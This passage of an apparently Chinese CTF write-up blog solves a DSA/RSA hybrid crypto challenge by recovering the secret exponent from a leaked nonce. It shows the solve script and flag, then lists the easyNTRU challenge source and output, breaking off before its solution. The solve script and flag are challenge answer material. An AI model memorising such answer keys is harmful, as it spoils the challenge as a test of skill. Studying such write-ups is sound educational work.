keyword">while</span> <span class="token literal-property property">True</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    p <span class="token operator">=</span> <span class="token function">getPrime</span><span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> q <span class="token operator">==</span> <span class="token number">0</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        <span class="token keyword">break</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        </pre></td></tr><tr><td data-num="14"></td><td><pre>h <span class="token operator">=</span> random<span class="token punctuation">.</span><span class="token function">randint</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> p<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>g <span class="token operator">=</span> <span class="token function">powmod</span><span class="token punctuation">(</span>h<span class="token punctuation">,</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">//q, p)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>x <span class="token operator">=</span> random<span class="token punctuation">.</span><span class="token function">randint</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>y <span class="token operator">=</span> <span class="token function">powmod</span><span class="token punctuation">(</span>g<span class="token punctuation">,</span> x<span class="token punctuation">,</span> p<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre>k <span class="token operator">=</span> random<span class="token punctuation">.</span><span class="token function">randint</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre>h <span class="token operator">=</span> <span class="token function">bytes_to_long</span><span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre>r <span class="token operator">=</span> <span class="token function">powmod</span><span class="token punctuation">(</span>g<span class="token punctuation">,</span> k<span class="token punctuation">,</span> p<span class="token punctuation">)</span> <span class="token operator">%</span> q</pre></td></tr><tr><td data-num="22"></td><td><pre>s <span class="token operator">=</span> <span class="token punctuation">(</span>h <span class="token operator">+</span> x<span class="token operator">*</span>r<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token function">invert</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> q<span class="token punctuation">)</span> <span class="token operator">%</span> q</pre></td></tr><tr><td data-num="23"></td><td><pre></pre></td></tr><tr><td data-num="24"></td><td><pre>c <span class="token operator">=</span> <span class="token function">powmod</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> x<span class="token punctuation">,</span> p<span class="token operator">*</span>q<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token function">print</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> q<span class="token punctuation">,</span> g<span class="token punctuation">,</span> y<span class="token punctuation">,</span> h<span class="token punctuation">,</span> r<span class="token punctuation">,</span> s<span class="token punctuation">,</span> c<span class="token punctuation">,</span> k<span class="token punctuation">,</span> sep<span class="token operator">=</span><span class="token string">','</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="27"></td><td><pre></pre></td></tr><tr><td data-num="28"></td><td><pre># p <span class="token operator">=</span> <span class="token number">94515040220263097875872541668071470619435707358211716562219917331797767488022053087267566586709944785329708571559126640339609375166385904147189950035630910404534642622114804635856314928438531544553236458244225698694846607333226704467932079712515971615643868209281460429629880920550469170449935295454629293399</span></pre></td></tr><tr><td data-num="29"></td><td><pre># q <span class="token operator">=</span> <span class="token number">1001535514136994695529636128311212301250326767869</span></pre></td></tr><tr><td data-num="30"></td><td><pre># g <span class="token operator">=</span> <span class="token number">89288700225171676599759774184146798321191748739703246395529001979988401303800066044674449834184095667747898974375431700503800142840899194492182057885675147681600217979466719692984863330298347742657472936559041930489702116255999412448996714923112824244267910808782794442895518685864174817501040060680962447941</span></pre></td></tr><tr><td data-num="31"></td><td><pre># y <span class="token operator">=</span> <span class="token number">93887528695360292524813814240190328732283663255426806128197957720674496260060703595933676082882204724501085633424942582304707395449222043328895852812543576418567716781870179606049899540449729036771290550645770978667075821043797569255787271932556218014920373462882329802597672026806552417735660553144344650642</span></pre></td></tr><tr><td data-num="32"></td><td><pre># h <span class="token operator">=</span> <span class="token number">775593521305134275967472254218401264703166138817</span></pre></td></tr><tr><td data-num="33"></td><td><pre># r <span class="token operator">=</span> <span class="token number">75084117510316201869105133948164969652170742276</span></pre></td></tr><tr><td data-num="34"></td><td><pre># s <span class="token operator">=</span> <span class="token number">599417004454208825884865529281453774324093134827</span></pre></td></tr><tr><td data-num="35"></td><td><pre># c <span class="token operator">=</span> <span class="token number">94203926294365722030261882520165826558476099177297861176153811285238289485953276649563642144753132730431066372867407177248194182778827143183520415437355921352580608448713381897280433120409711633310458263502217605470824497215111936036532237050330222480782799188409969149722885261258984444311562364318406725475829089368796269160936194172040318140462371217663</span></pre></td></tr><tr><td data-num="36"></td><td><pre># k <span class="token operator">=</span> <span class="token number">208672457767877303895327222020982963931779123819</span></pre></td></tr></table></figure><p>题给的变量很多，开始拿到这题的时候愣住了，但是不难看出来 x 是这题的关键，求出 x 即可正常解 RSA。</p>
<p>赛后看了 4xwi11 佬的博客才发现，这题真的不难 QAQ</p>
<p>告诉了</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>s <span class="token operator">=</span> <span class="token punctuation">(</span>h <span class="token operator">+</span> x<span class="token operator">*</span>r<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token function">invert</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> q<span class="token punctuation">)</span> <span class="token operator">%</span> q</pre></td></tr></table></figure><p>根据这一加密就不难推测出 x</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>x <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>s <span class="token operator">*</span> k <span class="token operator">-</span>h<span class="token punctuation">)</span><span class="token operator">*</span><span class="token function">invert</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span>q<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span>q</pre></td></tr></table></figure><p>呜呜呜，佬说简单推导都不算。</p>
<p>贴上 exp：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>from gmpy2 <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre>from Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>p <span class="token operator">=</span> <span class="token number">94515040220263097875872541668071470619435707358211716562219917331797767488022053087267566586709944785329708571559126640339609375166385904147189950035630910404534642622114804635856314928438531544553236458244225698694846607333226704467932079712515971615643868209281460429629880920550469170449935295454629293399</span></pre></td></tr><tr><td data-num="5"></td><td><pre>q <span class="token operator">=</span> <span class="token number">1001535514136994695529636128311212301250326767869</span></pre></td></tr><tr><td data-num="6"></td><td><pre>g <span class="token operator">=</span> <span class="token number">89288700225171676599759774184146798321191748739703246395529001979988401303800066044674449834184095667747898974375431700503800142840899194492182057885675147681600217979466719692984863330298347742657472936559041930489702116255999412448996714923112824244267910808782794442895518685864174817501040060680962447941</span></pre></td></tr><tr><td data-num="7"></td><td><pre>y <span class="token operator">=</span> <span class="token number">93887528695360292524813814240190328732283663255426806128197957720674496260060703595933676082882204724501085633424942582304707395449222043328895852812543576418567716781870179606049899540449729036771290550645770978667075821043797569255787271932556218014920373462882329802597672026806552417735660553144344650642</span></pre></td></tr><tr><td data-num="8"></td><td><pre>h <span class="token operator">=</span> <span class="token number">775593521305134275967472254218401264703166138817</span></pre></td></tr><tr><td data-num="9"></td><td><pre>r <span class="token operator">=</span> <span class="token number">75084117510316201869105133948164969652170742276</span></pre></td></tr><tr><td data-num="10"></td><td><pre>s <span class="token operator">=</span> <span class="token number">599417004454208825884865529281453774324093134827</span></pre></td></tr><tr><td data-num="11"></td><td><pre>c <span class="token operator">=</span> <span class="token number">94203926294365722030261882520165826558476099177297861176153811285238289485953276649563642144753132730431066372867407177248194182778827143183520415437355921352580608448713381897280433120409711633310458263502217605470824497215111936036532237050330222480782799188409969149722885261258984444311562364318406725475829089368796269160936194172040318140462371217663</span></pre></td></tr><tr><td data-num="12"></td><td><pre>k <span class="token operator">=</span> <span class="token number">208672457767877303895327222020982963931779123819</span></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre>n <span class="token operator">=</span> p <span class="token operator">*</span> q</pre></td></tr><tr><td data-num="15"></td><td><pre>phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>#s <span class="token operator">=</span> <span class="token punctuation">(</span>h <span class="token operator">+</span> x<span class="token operator">*</span>r<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token function">invert</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> q<span class="token punctuation">)</span> <span class="token operator">%</span> q</pre></td></tr><tr><td data-num="17"></td><td><pre>x <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>s <span class="token operator">*</span> k <span class="token operator">-</span>h<span class="token punctuation">)</span><span class="token operator">*</span><span class="token function">invert</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span>q<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span>q</pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token function">#print</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span><span class="token function">bit_length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre>d <span class="token operator">=</span> <span class="token function">invert</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>phi<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre>m <span class="token operator">=</span> <span class="token function">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token function">print</span><span class="token punctuation">(</span><span class="token function">long_to_bytes</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>运行即可得到：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">160</span></pre></td></tr><tr><td data-num="2"></td><td><pre>b<span class="token string">'DASCTF&#123;1d6f9460a596a4b38acc7263ea37b84d&#125;'</span></pre></td></tr></table></figure><h2 id="easyntru"><a class="anchor" href="#easyntru">#</a> easyNTRU</h2>
<p>附件信息：</p>
<p>easyNTRU.sage：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>from Crypto<span class="token punctuation">.</span>Hash <span class="token keyword">import</span> <span class="token constant">SHA3_256</span></pre></td></tr><tr><td data-num="2"></td><td><pre>from Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> <span class="token constant">AES</span></pre></td></tr><tr><td data-num="3"></td><td><pre>from Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>Padding <span class="token keyword">import</span> pad</pre></td></tr><tr><td data-num="4"></td><td><pre>from secret <span class="token keyword">import</span> flag</pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre># parameters</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token constant">N</span> <span class="token operator">=</span> <span class="token number">10</span></pre></td></tr><tr><td data-num="8"></td><td><pre>p <span class="token operator">=</span> <span class="token number">3</span></pre></td></tr><tr><td data-num="9"></td><td><pre>q <span class="token operator">=</span> <span class="token number">512</span></pre></td></tr><tr><td data-num="10"></td><td><pre>d <span class="token operator">=</span> <span class="token number">3</span></pre></td></tr><tr><td data-num="11"></td><td><pre>assert q<span class="token operator">></span><span class="token punctuation">(</span><span class="token number">6</span><span class="token operator">*</span>d<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span>p</pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token constant">R</span><span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> <span class="token constant">ZZ</span><span class="token punctuation">[</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre>#d1 1s and #d2 <span class="token operator">-</span>1s</pre></td></tr><tr><td data-num="16"></td><td><pre>def <span class="token constant">T</span><span class="token punctuation">(</span>d1<span class="token punctuation">,</span> d2<span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    assert <span class="token constant">N</span> <span class="token operator">>=</span> d1<span class="token operator">+</span>d2</pre></td></tr><tr><td data-num="18"></td><td><pre>    s <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">*</span>d1 <span class="token operator">+</span> <span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">*</span>d2 <span class="token operator">+</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token constant">N</span><span class="token operator">-</span>d1<span class="token operator">-</span>d2<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token function">shuffle</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token keyword">return</span> <span class="token constant">R</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre></pre></td></tr><tr><td data-num="22"></td><td><pre>def <span class="token function">invertModPrime</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    Rp <span class="token operator">=</span> <span class="token constant">R</span><span class="token punctuation">.</span><span class="token function">change_ring</span><span class="token punctuation">(</span><span class="token function">Integers</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">quotient</span><span class="token punctuation">(</span>x<span class="token operator">^</span><span class="token constant">N</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token keyword">return</span> <span class="token constant">R</span><span class="token punctuation">(</span><span class="token function">lift</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">/</span> <span class="token function">Rp</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre></pre></td></tr><tr><td data-num="26"></td><td><pre>def <span class="token function">convolution</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span> g<span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    <span class="token keyword">return</span> <span class="token punctuation">(</span>f<span class="token operator">*</span>g<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token punctuation">(</span>x<span class="token operator">^</span><span class="token constant">N</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="28"></td><td><pre></pre></td></tr><tr><td data-num="29"></td><td><pre>def <span class="token function">liftMod</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span> q<span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="30"></td><td><pre>    g <span class="token operator">=</span> <span class="token function">list</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>f<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> q<span class="token comment">//2) % q) - q//2 for i in range(N))</span></pre></td></tr><tr><td data-num="31"></td><td><pre>    <span class="token keyword">return</span> <span class="token constant">R</span><span class="token punctuation">(</span>g<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="32"></td><td><pre></pre></td></tr><tr><td data-num="33"></td><td><pre>def <span class="token function">polyMod</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span> q<span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="34"></td><td><pre>    g <span class="token operator">=</span> <span class="token punctuation">[</span>f<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">%</span>q <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token function">range</span><span class="token punctuation">(</span><span class="token constant">N</span><span class="token punctuation">)</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="35"></td><td><pre>    <span class="token keyword">return</span> <span class="token constant">R</span><span class="token punctuation">(</span>g<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="36"></td><td><pre></pre></td></tr><tr><td data-num="37"></td><td><pre>def <span class="token function">invertModPow2</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span> q<span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="38"></td><td><pre>    assert q<span class="token punctuation">.</span><span class="token function">is_power_of</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="39"></td><td><pre>    g <span class="token operator">=</span> <span class="token function">invertModPrime</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="40"></td><td><pre>    <span class="token keyword">while</span> <span class="token literal-property property">True</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="41"></td><td><pre>        r <span class="token operator">=</span> <span class="token function">liftMod</span><span class="token punctuation">(</span><span class="token function">convolution</span><span class="token punctuation">(</span>g<span class="token punctuation">,</span>f<span class="token punctuation">)</span><span class="token punctuation">,</span>q<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="42"></td><td><pre>        <span class="token keyword">if</span> r <span class="token operator">==</span> <span class="token number">1</span><span class="token operator">:</span> <span class="token keyword">return</span> g</pre></td></tr><tr><td data-num="43"></td><td><pre>        g <span class="token operator">=</span> <span class="token function">liftMod</span><span class="token punctuation">(</span><span class="token function">convolution</span><span class="token punctuation">(</span>g<span class="token punctuation">,</span><span class="token number">2</span> <span class="token operator">-</span> r<span class="token punctuation">)</span><span class="token punctuation">,</span>q<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="44"></td><td><pre></pre></td></tr><tr><td data-num="45"></td><td><pre>def <span class="token function">genMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="46"></td><td><pre>    result <span class="token operator">=</span> <span class="token function">list</span><span class="token punctuation">(</span><span class="token function">randrange</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token function">range</span><span class="token punctuation">(</span><span class="token constant">N</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="47"></td><td><pre>    <span class="token keyword">return</span> <span class="token constant">R</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="48"></td><td><pre></pre></td></tr><tr><td data-num="49"></td><td><pre>def <span class="token function">genKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="50"></td><td><pre>  <span class="token keyword">while</span> <span class="token literal-property property">True</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="51"></td><td><pre>    <span class="token keyword">try</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="52"></td><td><pre>      f <span class="token operator">=</span> <span class="token constant">T</span><span class="token punctuation">(</span>d<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> d<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="53"></td><td><pre>      g <span class="token operator">=</span> <span class="token constant">T</span><span class="token punctuation">(</span>d<span class="token punctuation">,</span> d<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="54"></td><td><pre>      Fp <span class="token operator">=</span> <span class="token function">polyMod</span><span class="token punctuation">(</span><span class="token function">invertModPrime</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="55"></td><td><pre>      Fq <span class="token operator">=</span> <span class="token function">polyMod</span><span class="token punctuation">(</span><span class="token function">invertModPow2</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span> q<span class="token punctuation">)</span><span class="token punctuation">,</span> q<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="56"></td><td><pre>      <span class="token keyword">break</span></pre></td></tr><tr><td data-num="57"></td><td><pre>    <span class="token literal-property property">except</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="58"></td><td><pre>      <span class="token keyword">continue</span></pre></td></tr><tr><td data-num="59"></td><td><pre>  h <span class="token operator">=</span> <span class="token function">polyMod</span><span class="token punctuation">(</span><span class="token function">convolution</span><span class="token punctuation">(</span>Fq<span class="token punctuation">,</span> g<span class="token punctuation">)</span><span class="token punctuation">,</span> q<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="60"></td><td><pre>  <span class="token keyword">return</span> h<span class="token punctuation">,</span> <span class="token punctuation">(</span>f<span class="token punctuation">,</span> g<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="61"></td><td><pre></pre></td></tr><tr><td data-num="62"></td><td><pre>def <span class="token function">encrypt</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> h<span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="63"></td><td><pre>  e <span class="token operator">=</span> <span class="token function">liftMod</span><span class="token punctuation">(</span>p<span class="token operator">*</span><span class="token function">convolution</span><span class="token punctuation">(</span>h<span class="token punctuation">,</span> <span class="token constant">T</span><span class="token punctuation">(</span>d<span class="token punctuation">,</span> d<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> m<span class="token punctuation">,</span> q<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="64"></td><td><pre>  <span class="token keyword">return</span> e</pre></td></tr><tr><td data-num="65"></td><td><pre></pre></td></tr><tr><td data-num="66"></td><td><pre># Step <span class="token number">1</span></pre></td></tr><tr><td data-num="67"></td><td><pre>h<span class="token punctuation">,</span> secret <span class="token operator">=</span> <span class="token function">genKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="68"></td><td><pre>m <span class="token operator">=</span> <span class="token function">genMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="69"></td><td><pre>e <span class="token operator">=</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> h<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="70"></td><td><pre></pre></td></tr><tr><td data-num="71"></td><td><pre><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">'h = %s'</span> <span class="token operator">%</span> h<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="72"></td><td><pre><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">'e = %s'</span> <span class="token operator">%</span> e<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="73"></td><td><pre></pre></td></tr><tr><td data-num="74"></td><td><pre># Step <span class="token number">2</span></pre></td></tr><tr><td data-num="75"></td><td><pre>sha3 <span class="token operator">=</span> <span class="token constant">SHA3_256</span><span class="token punctuation">.</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="76"></td><td><pre>sha3<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span><span class="token function">bytes</span><span class="token punctuation">(</span><span class="token function">str</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="77"></td><td><pre>key <span class="token operator">=</span> sha3<span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="78"></td><td><pre></pre></td></tr><tr><td data-num="79"></td><td><pre>cypher <span class="token operator">=</span> <span class="token constant">AES</span><span class="token punctuation">.</span><span class="token function">new</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> <span class="token constant">AES</span><span class="token punctuation">.</span><span class="token constant">MODE_ECB</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="80"></td><td><pre>c <span class="token operator">=</span> cypher<span class="token punctuation">.</span><span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token function">pad</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="81"></td><td><pre><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">'c = %s'</span> <span class="token operator">%</span> c<span class="token punctuation">)</span></pre></td></tr></table></figure><p>​</p>
<p>out:</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>h <span class="token operator">=</span> <span class="token number">39</span><span class="token operator">*</span>x<span class="token operator">^</span><span class="token number">9</span> <span class="token operator">+</span> <span class="token number">60</span><span class="token operator">*</span>x<span class="token operator">^</span><span class="token number">8</span> <span class="token operator">+</span> <span class="token number">349</span><span class="token operator">*</span>x<span class="token operator">^</span><span class="token number">7</span> <span class="token operator">+</span> <span class="token number">268</span><span class="token operator">*</span>x<span class="token operator">^</span><span class="token number">6</span> <span class="token operator">+</span> <span class="token number">144</span><span class="token operator">*</span>x<span class="token operator">^</span><span class="token number">5</span> <span class="token operator">+</span> <span class="token number">469</span><span class="token operator">*</span>x<span class="token operator">^</span><span class="token number">4</span> <span class="token operator">+</span> <span class="token number">449</span><span class="token operator">*</span>x<span class="token operator">^</span><span class="token number">3</span> <span class="token operator">+</span> <span class="token number">165</span><span class="token operator">*</span>x<span class="token operator">^</span><span class="token number">2</span> <span class="token operator">+</span> <span class="token number">248</span><span class="token operator">*</span>x <span class="token operator">+</span> <span class="token number">369</span></pre></td></tr><tr><td data-num="2"></td><td><pre>e <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">144</span><span class="token operator">*</span>x<span class="token operator">^</span><span class="token number">9</span> <span class="token operator">-</span> <span class="token number">200</span><span class="token operator">*</span>x<span class="token operator">^</span><span class="token number">8</span> <span class="token operator">-</span> <span class="token number">8</span><span class="token operator">*</span>x<span class="token operator">^</span><span class="token number">7</span> <span class="token operator">+</span> <span class="token number">248</span><span class="token operator">*</span>x<span class="token operator">^</span><span class="token number">6</span> <span class="token operator">+</span> <span class="token number">85</span><span class="token operator">*</span>x<span class="token operator">^</span><span class="token number">5</span> <span class="token operator">+</span> <span class="token number">102</span><span class="token operator">*</span>x<span class="token operator">^</span><span class="token number">4</span> <span class="token operator">+</span> <span class="token number">167</span><span class="token operator">*</span>x<span class="token operator">^</span><span class="token number">3</span> <span class="token operator">+</span> <span class="token number">30</span><span class="token operator">*</span>x<span class="token operator">^</span><span class="token number">2</span> <span class="token operator">-</span> <span class="token number">203</span><span class="token operator">*</span>x <span class="token operator">-</span> <span class="token number">78</span></pre></td></tr><tr><td data-num="3"></td><td><pre>c <span class="token operator">=</span> b<span class="token string">'\xb9W\x8c\x8b\x0cG\xde\x7fl\xf7\x03\xbb9m\x0c\xc4L\xfe\xe9Q\xad\xfd\xda!\x1a\xea@&#125;U\x9ay4\x8a\xe3y\xdf\xd5BV\xa7\x06\xf9\x08\x96="f\xc1\x1b\xd7\xdb\xc1j\x82F\x0b\x16\x06\xbcJMB\xc8\x80'</span></pre></td></tr></table></figure><p><span class="exturl" data-url="aHR0cHM6Ly80eHdpMTEuZ2l0aHViLmlvL3Bvc3RzL2EyYjZlY2QzLw==">学习 4WXi11 佬的 NTRU 系统</span></p>
<p>exp:</p>
